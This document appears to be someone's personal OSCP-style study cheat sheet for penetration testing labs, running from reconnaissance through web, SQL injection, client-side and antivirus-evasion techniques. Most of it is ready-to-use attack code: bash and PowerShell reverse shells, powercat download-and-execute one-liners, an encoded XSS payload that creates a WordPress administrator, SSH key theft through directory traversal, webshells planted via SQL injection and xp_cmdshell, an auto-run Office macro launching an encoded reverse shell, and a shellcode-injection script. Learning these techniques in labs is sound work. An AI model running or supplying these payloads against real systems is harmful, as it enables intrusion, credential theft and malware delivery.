****if DNS hangs on kali,use this tofix
```
service networking restart
```

ssh pattern for some machines
```
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" learner@192.168.50.52
```

## Info gathering
### Domain Registrar
```
whois offensive-security.com -h 192.168.210.251
```

## DNS enumeration

### DNS Recon
```
dnsrecon -d megacorpone.com -t std

dnsrecon -d megacorpone.com -D ~/list.txt -t brt
```
-t is the type of enumeration scan, in this case standard

### DNSEnum
```
dnsenum megacorpone.com
```

### Windows - nslookup
```
nslookup mail.megacorptwo.com

nslookup -type=TXT info.megacorptwo.com 192.168.50.151
```

## TCP / UDP Port Scanning

nc flags -> -u for udp, -w wait time, -z zero io

```
nc -nvv -w 1 -z 192.111.999.999 1-1999
nc -u -w 1 -z 192.111.999.999 1-1999
```

### Nmap

```
sudo nmap -sS $ip # stealth / syn scan
nmap -sT $ip # tcp connect scan
sudo nmap -sS -p 1-65535 $addr  2>/dev/null | grep open > ports.txt # scan all ports


nmap -sU $ip # udp scan

sudo nmap -sS -sU $ip # tcp + udp

# network sweeping
nmap -v -sn 192.168.50.1-253
nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt # output greppable format
nmap -v -p 80 -sn 192.168.50.1-253 # scan for port on range of networks


nmap -sT -A --top-ports=20 192.168.50.1-253 -oG top-port-sweep.txt  # TCP connect scan for top 20 points with OS version, scrpts, and traceroute -A
```

top 20 nmap ports are determined using the /usr/share/nmap/nmap-services file

```
sudo nmap -O $ip # os fingerprinting
sudo nmap -O $ip --os-scan-guess # force nmap to print os guess
```
can use script helpers for common cases

```
nmap --script http-headers $ip
nmap --script-help http-headers
```

### Windows Port Scans
```
Test-NetConnection -Port 445 192.168.50.151
# one-liner to scan ports
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null 
```

## SMB

Typically port 445, often goes hand-in-hand with NetBios (protocol on port 139 to help computers talk on LAN)

```
sudo nbtscan -r 192.168.50.0/24 # -r helps us enumerate through network

nmap -v -p 139,445 --scrpt smb-os-discovery $ip # use nmap script to enumerate smb
```

For windows, we can use `net view` to view all SMB shares

```
net view \\dc01 /all
```

## SMTP

VRFY root -> verifies email address
EXPN -> asks for membership in a mailing list

can use nc to run commands

```
nc -nv 192.168.50.8 25
VRFY root
VRFY idontexist
```

python script to run VRFY
`python3 smtp.py root 192.168.50.8`

```
#!/usr/bin/python

import socket
import sys

if len(sys.argv) != 3
        print("Usage: vrfy.py <username> <target_ip>")
        sys.exit(0)

# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Server
ip = sys.argv[2]
connect = s.connect((ip,25))

# Receive the banner
banner = s.recv(1024)

print(banner)

# VRFY a user
user = (sys.argv[1]).encode()
s.send(b'VRFY ' + user + b'\r\n')
result = s.recv(1024)

print(result)

# Close the socket
s.close()
```

### Windows 
check if SMTP is up
```
Test-NetConnection -Port 25 192.168.50.8
```

we can install telnet on windows if have admin access
```
dism /online /Enable-Feature /FeatureName:TelnetClient
```
could also transfer it from another machine if pre-installed

once installed it's similar to nc

```
telnet 192.168.50.8 25
VRFY goofy
VRFY root
```

## SNMP
can use nmap
```
sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt
```

alternatively use onesixtyone, need to load community strings into file
```
echo public > community
echo private >> community
echo manager >> community
for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
onesixtyone -c community -i ips`
```

query SNMP services with snmpwalk
-t timeout
-v1 version 1
```
snmpwalk -c public -v1 -t 10 192.168.50.151
```

```
snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25
```

## Vulnerability scanning

### Nessus
installation

```
sudo apt install ./Nessus-10.5.0-debian10_amd64.deb
```
starting the service
```
sudo systemctl start nessusd.service
```

access on https://127.0.0.1:8834

### Nmap

can use scripts to automate
-sV -> service detection
"vuln" -> all the scripts in the category

```
sudo nmap -sV -p 443 --script "vuln" $ip
```

if we save a new script must update script db before executing
```
sudo cp /home/kali/Downloads/http-vuln-cve-2021-41773.nse /usr/share/nmap/scripts/http-vuln-cve2021-41773.nse
sudo nmap --script-updatedb
sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.50.124
```

## Web Apps

### Nmap
```
sudo nmap -sV -p 80 $ip


sudo nmap -p 80 --script=http-enum $ip
```

### Wapplyzer
https://www.wappalyzer.com/



### Gobuster

-u target ip
-t thread count (default 10)
dir == dir mode, only enumerates files and dirs

```
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
```

Note: don't forget about `robots.txt` and debugging page content when looking for clues!

## Api Brute Force
-p use a pattern file

```
echo {GOBUSTER}/v1 > pattern;
echo {GOBUSTER}/v2 >> pattern;
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```

-i flag for curl shows response headers
```
curl -i http://192.168.50.16:5002/users/v1
```

login with curl
-d = data
```
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```

can sometimes inject `admin: True` keys into request params
```
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
```

## Cross Site Scripting (XSS)
stored XSS -> inject exploit payload into db or cache
reflected -> malicious request link
### Cookies
Secure -> only send cookie over encrypted connection
HttpOnly -> deny JS access to cookies

JS code to grab nonce and create new admin user

```
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

can use jscompress.com to minify JS payload 

afterwards we can encode it in utf-16 to make sure any invalid characters don't exist

charCodeAt -> converts to UTF-16

```
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

can then use the eval(String.fromCharCode) in the payload to decode the JS and execute it

```
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
```

python2 pseudo-terminal
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Common Web App Attacks

### Directory Traversal

1. check for directory traversal
2. try to find private ssh keys
3. connect via ssh to shell

`/var/www/html` is typical linux web dir root

should check for ssh keys
```
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```

setting up ssh after stealing key
-i use this file
```
chmod 400 $dt_key
ssh -i dt_key -p 2222 offsec@mountaindesserts.com
```

linx -> /etc/passwd
windows -> C:\Windows\System32\drivers\etc\hosts
try both \ and / with file paths on windows

../ might be filtered by a firewall -> so we may want to encode the dots

### LFI

bash tcp reverse shell one liner

```
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
```

risk with the above is that it could be using the bourne shell rather than bash
wrap it in bash -c to ensure no syntax errors

```
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```
```
Outside PHP, we can also leverage LFI and RFI vulnerabilities in other frameworks or server-side scripting languages including Perl,11 Active Server Pages Extended,12 Active Server Pages,13 and Java Server Pages
```

to check sudo privileges
```
sudo -l
```

### PHP Wrappers

can use a wrapper to see php source code.  often times anything with <?php> tags will get executed by the server. so we want the source code sent base64 encoded so that backend templating languages won't execute it.

#### php://filter 
basic filter -- won't always work for reasons above

```
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
```

base64 encoded option works better
```
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
echo -n $result | base64 -d
```
#### data://
let's us execute plain text. although sometimes firewalls will filter out php snippets so we need to encode

```
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

base64 encoded version 

```
echo -n echo -n '<?php echo system($_GET["cmd"]);?>' | base64
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

### RFI

`/usr/share/webshells/php/simple-backdoor.php` simple php webshell

start a python web server

```
python3 -m http.server 8080
```

## File Uploads
### Executable File Upload

can sometimes fool extension checker by using capital letters -> script.PhP

Powershell one liner for reverse shell

```
New-Object System.Net.Sockets.TCPClient("192.168.45.235",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

Sequence for powershell reverse shell
1. open up pwsh
2. copy the one liner
3. encode the line
4. send it via curl

```
pwsh

$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.235",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText

exit
```

powershell needs an enc parameter to specify encoding

```
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB
```

### Non-execution file upload

can attempt to overwrite authorized_keys for ssh

```
ssh-keygen
cat .ssh/id_rsa.pub > attack.pub
```

then upload to `../../../../root/.ssh/authorized_keys

sometimes have to remove known hosts file
```
rm ~/.ssh/known_hosts
```

### OS command injection

can use the -X flag with curl for POST requests

```
curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
```

can use `git version` to reveal OS

url-encoded semicolon is `%3B`

```
curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
```

for windows, we need to check if it's running CMD or powershell

```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

we can url encode this and send


```
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
```

can use powercat for a windows reverse shell in pwsh

```
/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80
nc -lnvp 4444
```

pwsh command for powercat reverse shell

```
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.235/powercat.ps1");powercat -c 192.168.45.235 -p 4444 -e powershell 
```

encoded

```
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```

check `sudo su` to see if you can elevate to root shell

useful injections 

```

    &
    &&
    |
    ||
    ;
    \n
    `
    $()

```

## SQL Injection

### MySQL

```
mysql -u root -p'root' -h 192.168.50.16 -P 3306
select version();
select system_user();
show databases;
```

### MSSQL

can use impacket

```
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth


SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM offsec.information_schema.tables;
select * from offsec.dbo.users;
```

## Manual SQLi

### Using error payloads

example injection


```
offsec' OR 1=1 -- //
SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --
```
quick check is to append a special char liek an ' to username field to see if we get a SQL error message

can use the IN operator to execute queries

```
' or 1=1 in (select @@version) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

### UNION-based payloads
For UNION SQLi attacks to work, we first need to satisfy two conditions:
    1. The injected UNION query has to include the same number of columns as the original query.
    2. The data types need to be compatible between each column.

Need to know exact number of columns present. to discover this we can run:
```
' ORDER BY 1-- //
```

The above statement orders the results by a specific column, meaning it will fail whenever the selected column does not exist.

if we have 5 columns and a query like
```
select * from users where name LIKE cmd%
```

we can inject:

```
%' UNION SELECT database(), user(), @@version, null, null -- // database won't show up bc it's not an int
%' UNION SELECT null, database(), user(), @@version, null, null -- // better bc vals are all in string cols
```

can query information_schema table to find info on other tables
```
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
' UNION SELECT null, username, password, description, null FROM users -- //
```

### Blind SQLi

out of band -- outside the web app

can do this via url enumeration
```
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- // boolean based
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- // time-based, will know if the user exists if the app hangs
```
look for a `?debug=true` option in source code

## Manual Code Execution

### MSSQL -- xp_cmdshell

first need to enable xp_cmdshell

```
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```

can use SELECT INTO_OUTFILE for RCE
combined with php system command

```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

### Automated attacks

use sqlmap
-u url
-p parameter we want to test
```
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
```

can use the --dump param to dump database, creds, etc
--os-shell provides us with full interactive shell

```
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
```

-r use this file for the request
```
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
```

when on a wordpress site, running `wpscan` with an api token is a good idea 

zip a file kali
```
zip x.zip pentestmonkey_reverse.php style.css
```

find all text files on a machine
```
find / -type f -name 'flag.txt' 2>/dev/null 1>hello
```

find all files with OS{ in them
```
find / -type f -name 'flag.txt' -exec grep -i "OS{" {} + 2>/dev/null 1>hello
```

10.3.2.6 Steps

1. found sqli on class form
2. used cast to get values from db via error message

```
weight=12&height=' and 1=cast((SELECT passwd FROM pg_shadow LIMIT 1 OFFSET 1) as int) and '1'='1' -- //&email=a%40a.com

pg_query(): Query failed: ERROR:  invalid input syntax for type integer: &quot;glovedb&quot; in <b>/var/www/html/class.php</b>

```
3. got password hash and tried cracking with md5 -- didn't work
```
weight=12&height=' and 1=cast((SELECT passwd FROM pg_shadow LIMIT 1 OFFSET 1) as int) and '1'='1' -- //&email=a%40a.com
```
4. decided to overwrite user's password instead
```
weight=12&height='; alter user rubben with password 'password' -- //&email=a%40a.com
```

5. used cve-2019-9193.py  (since we're on postgres) with new password. passed in reverse shell command

```
python3 cve-2019-9193.py -i 192.168.198.49 -d glovedb -U rubben -P password -c bash -c "bash -i >& /dev/tcp/192.168.45.202/4444 0>&1"
```


For windows IIS servers, we need to use gobuster with aspx extension and word list.  also disable errors

need to enable cmd_shell
```
'EXECUTE sp_configure 'show advanced options',1;RECONFIGURE;EXECUTE sp_configure 'xp_cmdshell',1;RECONFIGURE;EXECUTE master.dbo.xp_cmdshell 'powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.45.235/powercat.ps1\");powercat -c 192.168.45.235 -p 4444 -e powershell"';--+//
```

** Make sure to go back to root directory before running
Powershell command to recursively search for file

```
Get-ChildItem flag.txt -File -Recurse -ErrorAction SilentlyContinue
```

```
gobuster dir -u http://192.168.198.50 -x aspx -w aspx.txt --no-error
```

## Client-side attacks


### Info Gathering

can use 'exiftool' to investigate metadata on docs
-a display duplicate tags
-u display unknon tags

```
exiftool -a -u brochure.pdf
```

-x flag with gobuster searches for specific extensions
```
gobuster dir -u http://192.168.237.197 -x pdf -w /usr/share/dirb/wordlists/common.txt
```

### Client Fingerprinting

can use canarytokens with a link to get client info

### Exploiting MS Office

user must Enable Editing for the attack to take place

### Installing MS OFfice
need to use xfreerdp rather than rdesktop to have access

xfreerdp /u:offsec /p:password /v:192.168.20.20

### MS Office Macros

ActiveX Objects -> can access underlying operating system commands. achieved via wscript through windows host shell

```
Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
```

need to add autoopen and document_open procedures to snsure run when opened

```
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
```

can use powercat to get reverse shell
Dim -> var declaration
note that strings can only be 255 chars

powercat download and reverse shell command pre-base64 encoding

```
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
```

python script to split up encoded poewrcat string

```
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')

```

finally we can finish our macro

```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub
```

then:
1. download powercat.exe onto local machine
2. start python server
3. start nc listening
4. wait for macro to execute

useful command copy string to clipboard xfreerdp
```
echo IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/payload") | Set-Clipboard
```

use impacket-smbserver to set up a share on kali to share files

```
impacket-smbserver share /home/kali/offsec/oscp -smb2support -user user -password password
```

then on windows connect to share

```
net use X: \\$ip\share /u:user password
```

### Windows Library Files

.Library-ms extension
payload in .lnk file
WebDav share -> allows uses to access and manage files on remote servers
use wsgidav to setup local http server, can confirm it's running by going to 127.0.0.1 in browser

```
mkdir /home/kali/webdav
touch /home/kali/webdav/test.txt
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

example template https://learn.microsoft.com/en-us/windows/win32/shell/library-schema-entry

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
    <name>@shell32.dll,-34575</name>
    <ownerSID>S-1-5-21-379071477-2495173225-776587366-1000</ownerSID>
    <version>1</version>
    <isLibraryPinned>true</isLibraryPinned>
    <iconReference>imageres.dll,-1002</iconReference>
    <templateInfo>
        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
    </templateInfo>
    <searchConnectorDescriptionList>
        <searchConnectorDescription publisher="Microsoft" product="Windows">
            <description>@shell32.dll,-34577</description>
            <isDefaultSaveLocation>true</isDefaultSaveLocation>
            <simpleLocation>
                <url>knownfolder:{FDD39AD0-238F-46AF-ADB4-6C85480369C7}</url>
                <serialized>MBAAAEAFCAAA...MFNVAAAAAA</serialized>
            </simpleLocation>
        </searchConnectorDescription>
        <searchConnectorDescription publisher="Microsoft" product="Windows">
            <description>@shell32.dll,-34579</description>
            <isDefaultNonOwnerSaveLocation>true</isDefaultNonOwnerSaveLocation>
            <simpleLocation>
                <url>knownfolder:{ED4824AF-DCE4-45A8-81E2-FC7965083634}</url>
                <serialized>MBAAAEAFCAAA...HJIfK9AAAAAA</serialized>
            </simpleLocation>
        </searchConnectorDescription>
    </searchConnectorDescriptionList>
</libraryDescription>
```

offsec version

isLibraryPinned -> is library pinned in windows explorer

iconReference -> which icon to use (imageres.dll, -1003 is an img icon)

folderType -> use Documents guid

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">

<name>@windows.storage.dll,-34582</name>
<version>6</version>

<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>

<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>

<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>

</libraryDescription>
```

easy way to send email


```
sendemail -f test@supermagicorg.com -xu test@supermagicorg.com -xp test -t dave.wizard@supermagicorg.com -u please open -m hello -s 192.168.210.199 -a config.Library-ms
```

don't forget to search txt,pdf files in gobuster

```
gobuster dir -u http://192.168.210.199 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x pdf,txt
```


## Online Exploit Resources

ExploitDb
Packet Storm -- Security News + Exploits

Metasploit
Core Impact
Canvas
BeEF


searchsploit update
```
sudo apt update && sudo apt install exploitdb
```

use -m flag with searchsploit to copy exploit into local dir
```
searchsploit -m windows/remote/48537.py
# Or
searchsploit -m 42031
```

use curl to url encode data and get reverse shell
```
curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=which nc"
curl http://192.168.194.11/project/uploads/users/830954-backdoor.php --data-urlencode cmd=nc -nv 192.168.45.235 6666 -e /bin/bash/
```

use nmap smb-share-enum script to get smb shares then smbclient to access
```
sudo nmap --script=smb-enum-shares 192.168.194.10
smbclient //192.168.194.10/offsec -c dir Downloads/*
```

msfvenom to generate reverse shell payload
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.235 LPORT=4444 -f exe > windows_reverse_shell.exe
```
cross-compiling windows exploits on kali
```
sudo apt install mingw-w64
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

using msfvenom for reverse shell
-f format
-e encoding
-b bad chars

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

use -k command with curl to not verify certs
```
curl -k https://192.168.214.45/uploads/shell.php?cmd=whoami
```

use metasploit to create a reverse shell

```
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.45.235
set LPORT 4444
exploit
```

meterpreter shell one-liner
```
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
```

## Antivirus Evasion

Use virustotal.com to check AV detection
https://antiscan.me allegedly doesn't send samples

### Thread injection

script to inject into ps process

```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]] $sc = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0xb8,0x90,0x1,0x0,0x0,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x5,0x68,0xc0,0xa8,0x32,0x1,0x68,0x2,0x0,0x1,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xc,0xff,0x4e,0x8,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x68,0x63,0x6d,0x64,0x0,0x89,0xe3,0x57,0x57,0x57,0x31,0xf6,0x6a,0x12,0x59,0x56,0xe2,0xfd,0x66,0xc7,0x44,0x24,0x3c,0x1,0x1,0x8d,0x44,0x24,0x10,0xc6,0x0,0x44,0x54,0x50,0x56,0x56,0x56,0x46,0x56,0x4e,0x56,0x56,0x53,0x56,0x68,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x89,0xe0,0x4e,0x56,0x46,0xff,0x30,0x68,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

